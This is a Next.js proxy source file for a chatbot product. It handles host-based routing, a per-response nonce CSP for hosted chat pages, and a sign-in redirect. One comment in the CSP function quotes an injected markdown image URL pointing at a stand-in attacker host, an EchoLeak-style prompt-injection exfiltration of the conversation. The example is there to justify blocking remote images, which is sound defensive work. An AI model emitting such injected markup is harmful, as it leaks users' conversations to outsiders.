import { NextResponse, type NextRequest } from 'next/server';

import { API_ORIGIN } from './lib/env';

/**
 * `proxy.ts` — Next 16's rename of `middleware.ts` (Node runtime only, not configurable). A matcher
 * copied from a Next 15 answer sits in a file called `middleware.ts` and guards NOTHING.
 *
 * THIS IS NOT THE AUTHORIZATION GATE, and no change may make it one. CVE-2025-29927 skipped every
 * Next.js middleware with a single request header; any design where the proxy is the gate fails
 * open on the next equivalent bug. Laravel returning 401/403/404 is the gate. What lives here:
 *
 *  1. Host -> namespace ROUTING (ADR-027). Admin is `/*` and hosted chat is `/c/[publicBotId]`;
 *     on `chat.<domain>` a visitor's `/<publicBotId>` is rewritten under `/c/`. Without the
 *     prefix the static `/bots` route beats the dynamic chat route and hosted chat renders the
 *     admin bots page.
 *  2. The hosted-chat CSP, because its nonce must be per response. Next reads the nonce out of the
 *     REQUEST's Content-Security-Policy header and applies it to its own inline bootstrap scripts.
 *     Consequence, accepted deliberately: chat pages render dynamically. What is genuinely
 *     cacheable by `publicBotId` — the bot-config fetch and `theme.css` — still is.
 *  3. A UX redirect for a visitor who does not LOOK signed in. Cookie presence is not a session.
 */

const SESSION_COOKIE = 'laravel_session';

/**
 * The browser's OTLP ingest path (ADR-025). It is carved out of BOTH branches below, and each
 * carve-out fixes a different silent failure:
 *
 *  - On `chat.<domain>` every path is rewritten under `/c/`, so an uncarved exporter POST lands on
 *    `/c/telemetry/v1/traces` — a 404 that the exporter reports nowhere, so hosted chat simply has
 *    no browser traces and nothing says so.
 *  - On `app.<domain>` a visitor with no session cookie is redirected to `/login`. A 307 preserves
 *    the method, so the exporter re-POSTs its spans at a page route — and a signed-out visitor is
 *    exactly the state the login and error surfaces most need traces from.
 *
 * It is an exact prefix and must stay one. Widening it to a name a page route could also match
 * would hand an unauthenticated path to something that reads the session.
 */
const TELEMETRY_PREFIX = '/telemetry/';

const isTelemetryPath = (pathname: string): boolean => pathname.startsWith(TELEMETRY_PREFIX);

type Namespace = 'admin' | 'chat' | 'unrestricted';

function namespaceFor(host: string | null): Namespace {
  const hostname = (host ?? '').split(':')[0]?.toLowerCase() ?? '';
  // Local development runs both surfaces on one hostname, so host enforcement has to stand down
  // there or hosted chat becomes untestable. Production hostnames always carry a subdomain.
  if (hostname === 'localhost' || hostname === '127.0.0.1' || !hostname.includes('.')) {
    return 'unrestricted';
  }
  return hostname.startsWith('chat.') ? 'chat' : 'admin';
}

function chatCsp(nonce: string): string {
  return [
    "default-src 'self'",
    // 'strict-dynamic' plus the nonce: any script Next loads from a nonced bootstrap inherits
    // trust, and nothing else runs. No 'unsafe-inline', ever — hosted chat renders model-generated
    // Markdown, the highest-risk sink in the product.
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    // 'self' covers the theme stylesheet route because it is a REAL stylesheet response. A nonced
    // inline <style> would force the route dynamic; a style="" attribute is not covered by a nonce
    // at all (tailwind-shadcn gotcha 2).
    "style-src 'self'",
    // No remote images. An injected `![](https://attacker/?d=…)` in model output is an
    // unauthenticated outbound GET carrying the conversation — EchoLeak, CVE-2025-32711.
    "img-src 'self' data:",
    "font-src 'self'",
    `connect-src 'self' ${API_ORIGIN}`,
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    // Hosted chat is our own page, not the embedded widget; the widget's per-request
    // frame-ancestors lives in apps/widget and is owned by kb-security-baseline.
    "frame-ancestors 'none'",
  ].join('; ');
}

export default function proxy(request: NextRequest): NextResponse {
  const { pathname, search } = request.nextUrl;
  const namespace = namespaceFor(request.headers.get('host'));
  const isChatPath = pathname === '/c' || pathname.startsWith('/c/');

  // Before every branch: no rewrite, no redirect, no CSP. The handler is a byte relay to the
  // Collector — it renders nothing, reads no session, and produces no organization-scoped byte.
  if (isTelemetryPath(pathname)) return NextResponse.next();

  // --- hosted chat -----------------------------------------------------------------------------
  if (namespace === 'chat' || (namespace === 'unrestricted' && isChatPath)) {
    const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
    const csp = chatCsp(nonce);

    const requestHeaders = new Headers(request.headers);
    requestHeaders.set('content-security-policy', csp);
    requestHeaders.set('x-kb-nonce', nonce);

    const target = request.nextUrl.clone();
    if (namespace === 'chat' && !isChatPath) {
      // chat.<domain>/<publicBotId> -> /c/<publicBotId>. Everything on this host lands under the
      // chat namespace, so no admin route is reachable from the origin that renders model output.
      target.pathname = `/c${pathname}`;
    }

    const response =
      target.pathname === pathname
        ? NextResponse.next({ request: { headers: requestHeaders } })
        : NextResponse.rewrite(target, { request: { headers: requestHeaders } });

    response.headers.set('content-security-policy', csp);
    return response;
  }

  // --- admin console ---------------------------------------------------------------------------
  if (namespace === 'admin' && isChatPath) {
    // Hosted chat must never render on the origin the admin session cookie is scoped to: one XSS
    // in model output there would execute with a real admin credential attached.
    return NextResponse.redirect(new URL('/', request.url));
  }

  const looksSignedIn = request.cookies.has(SESSION_COOKIE);
  if (!looksSignedIn && pathname !== '/login') {
    // UX ONLY. The cookie may be expired, revoked, or for a user with no membership — Laravel
    // decides, and every page beneath this fetches from the browser and handles its own 401.
    const login = new URL('/login', request.url);
    if (pathname !== '/') login.searchParams.set('next', `${pathname}${search}`);
    return NextResponse.redirect(login);
  }

  return NextResponse.next();
}

export const config = {
  // Static assets and the image optimizer are skipped: they carry no session, and running a
  // per-request nonce mint for every chunk request is pure cost.
  matcher: ['/((?!_next/static|_next/image|favicon.ico|robots.txt).*)'],
};
